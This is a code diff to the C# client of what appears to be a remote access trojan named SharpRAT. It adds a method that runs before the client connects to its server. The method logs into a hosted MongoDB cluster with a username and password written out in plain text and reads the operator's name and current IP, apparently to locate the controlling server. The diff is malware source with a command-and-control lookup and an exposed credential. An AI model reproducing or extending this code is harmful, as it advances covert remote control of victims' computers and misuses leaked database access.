@@ -5,6 +5,10 @@ using System.Net;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading.Tasks;
+using MongoDB.Bson;
+using MongoDB.Bson.IO;
+using MongoDB.Driver;
+using Newtonsoft.Json.Linq;
 
 namespace Client.Client
 {
@@ -45,6 +49,7 @@ namespace Client.Client
             {
                 try
                 {
+                    MongoFetch();
                     // Connect to server, currently localhost and port 11111.
                     IPHostEntry ipHost = Dns.GetHostEntry(Dns.GetHostName());
                     IPAddress ipAddress = ipHost.AddressList[0];
@@ -52,7 +57,7 @@ namespace Client.Client
 
                     // TCP/IP Socket.
                     serverSocket = new(ipAddress.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
-
+                    
                     try
                     {
                         // Connect to server.
@@ -82,6 +87,29 @@ namespace Client.Client
                     Console.WriteLine(e.ToString());
                 }
             }
+        }
+        public void MongoFetch()
+        {
+            /*
+            string test = @"{
+            '_id:':ObjectId('')
+            'AdminName':'test',
+            'CurrentIp':'ip'
+            }";
+            */
+            var client = new MongoClient(
+                    "mongodb+srv://Snutri:tCbJtoBWdEHCOEjS@sharprat.t4wds.mongodb.net/SharpRAT?retryWrites=true&w=majority");
+            var db = client.GetDatabase("SharpRAT");
+            
+            var connections = db.GetCollection<BsonDocument>("connections");
+            var list = connections.Find(new BsonDocument());
+            var firstDocument = connections.Find(new BsonDocument()).FirstOrDefault();
+            //System.Diagnostics.Debug.WriteLine(firstDocument.ToString());
+            var test = firstDocument.ToString();
+            var details = JObject.Parse(test);
+            System.Diagnostics.Debug.WriteLine(string.Concat("Hi ", details["AdminName"], " " + details["CurrentIp"]));
+
+
         }
     }
 }
